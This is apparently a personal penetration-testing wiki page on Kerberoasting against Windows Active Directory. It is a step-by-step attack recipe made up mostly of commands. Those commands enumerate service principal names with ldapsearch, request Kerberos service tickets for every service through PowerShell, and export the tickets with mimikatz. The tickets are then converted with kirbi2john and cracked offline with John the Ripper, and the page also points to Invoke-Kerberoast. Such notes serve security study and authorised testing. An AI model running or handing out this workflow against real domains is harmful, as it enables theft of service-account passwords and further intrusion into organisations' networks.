Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-30T17:25:03-05:00

====== Kerberoasting ======
Created Saturday 30 October 2021

* This technique focusses on obtaining a Service Ticket for a Service (SPN), using a ligitimage account.
* We'll use a powershell script to request a Service Ticket, which is encrypted using the hash of the password of the service account the service runs under.
* Then we'll download it and attempt to brute-force the password.
* This technique does NOT require admin privileges. (YAY)
* Mimikatz is required on the target host

===== Old way =====

==== Step 1 ====
Enumerate SPN's
{{{code: lang="sh" linenumbers="False"
ldapsearch -LLL -H ldap://ip -D <user>@<domain>.<tld> -w <password> -b "dc=<domain>,dc=<tld>" "servicePrincipalName=*" | grep servicePrincipalName
}}}

* Can be run be non-privileged user

==== Step 2 ====
In powershell:
{{{code: lang="powershell" linenumbers="False"
Add-Type -AssemblyName System.IdentityModel;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN>
}}}

* Replace <SPN> with the Service Prinicpal Name of the service
* See [[Tools:Linux:ldapsearch]] for an example how to enumerate services

Or:
{{{code: lang="powershell" linenumbers="False"
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
}}}

* Requests TGS for all services on the current domain

==== Step 3 ====
Open mimikatz, run this:
{{{code: lang="texinfo" linenumbers="False"
kerberos::list /export
}}}


==== Step 4 ====
Dowload the .kirbi files to your system

==== Step 5 ====
Convert the .kirbi files to a format john likes:
{{{code: lang="sh" linenumbers="False"
 ~/tools/kerberoast/kirbi2john.py *.kirbi -o tickets.john
}}}


==== Step 6 ====
Crack away with John
{{{code: lang="sh" linenumbers="False"
john tickets.john --format=krb5tgs --wordlist=<wordlist> 
}}}




===== Modern way =====

Use [[Tools:Windows:PowerShell:Invoke-Kerberoast.ps1]]
* Upload script to target
* Execute (see example)
* Download file
* Happy cracking (no format flag needed)


===== SEE =====
[[Technologies:Windows:Active Directory]]
[[Tools:Windows:mimikatz]]
[[Tools:Linux:kerberoast]]

https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/
https://www.youtube.com/watch?v=beRDcvBwTBw (Walkthrough of old way)

